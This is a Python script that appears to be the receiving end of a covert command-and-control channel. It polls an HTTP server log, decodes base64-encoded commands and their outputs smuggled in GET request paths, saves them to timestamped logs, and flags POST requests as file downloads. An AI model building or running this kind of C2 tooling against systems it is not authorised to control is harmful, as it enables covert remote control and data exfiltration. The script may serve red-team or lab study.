#!/usr/bin/python3

import sys, os
import re
import base64
import time
import datetime

#############
##
## Simple Server that checks eguiHTTPS.py logs and prints back
## Saves to log file
## 
## Add more info here
#########################

# Generate Time as Log
t = time.localtime()
current_time = time.strftime("%H%M%S", t)
today = datetime.date.today()
LOG = str(today)+ '-' + current_time
#print LOG



oldInput = ""
Input = ""
Results = ""

#execfile('./egui-http.py &>> log.txt')

#os.system('python egui-http.py &>> log.txt')

while True:
     
    #with open('./ServerRequirements/log.txt', 'r') as f:
    with open('./ServerRequirements/log.txt', 'r',  encoding="iso-8859-1") as f:
        lineList = f.readlines() # read lines
        #print(lineList)
        lastLine = lineList[len(lineList)-1] # read last linei
        #print(lastLine)    
        SearchStr = re.search(r'GET (.*?) HTTP', lastLine) # search for string between GET and HTTP.. which should be the base64
        #print("SearchStr: " + str(SearchStr))
        SearchDL = re.search(r'POST (.*?) HTTP', lastLine)
        #print("SearchDL: " + str(SearchDL))
        #time.sleep(5)
        if SearchStr:
            #print SearchStr.groups() # prints if true
            Output = str(SearchStr.groups())
            #print("Output is: ")
            #print(Output)
            try:  
                #print("Trying to get this to work: ")
                InputTest = (Output.split("/")[1])
                base64_bytes = InputTest.encode('ascii')
                InputMessage = base64.b64decode(base64_bytes)
                Input = InputMessage.decode('ascii')
                #print(Input)

                ResultTest = (Output.split("/")[2])
                base64_bytes = ResultTest.encode('ascii')
                ResultMessage = base64.b64decode(base64_bytes)
                Results = ResultMessage.decode('ascii')
                #print(Results)
                #Input = base64.b64decode(Output.split("/")[1]) # Made a 2 instead of 1 because of SErverRequirements
                # Changed back to 1 instead of a 2 because I removed ServerRequirements directory
                #print Input
                #Results = base64.b64decode(Output.split("/")[2])
                #print Results
            except IndexError:
                continue
            except TypeError:
                continue
            except UnicodeDecodeError:
                continue
            except binascii.Error as msg:
                continue # Ignore this error?

            if Input != oldInput:
                #print("Command: " + Input)
                #print("Output: " + Results)

                # Write to a temp file.. maybe this will work on commandserver?
                e = open("./Logs/temp.txt", "w")
                e.write("Command: " + Input + '\n')
                e.write("Ouput: " + Results + '\n')
                e.close()

                # Save to Log
                f = open("./Logs/" + LOG + "-log.txt", "a")
                f.write(Input + '\n')
                f.write(Results + '\n')
                f.write('\n')
    
        elif SearchDL:
            #print SearchDL.groups()
            #time.sleep(5)
            #print("SEARCH DL")
            Output = str(SearchDL.groups())
            Input = str(SearchDL.groups())
            
            #print(Output)
            #print(Input)

            if Input != oldInput:
                print("File Downloaded")

        #else:
            #time.sleep(5)

    oldInput = Input
    oldResults = Results
    time.sleep(5)
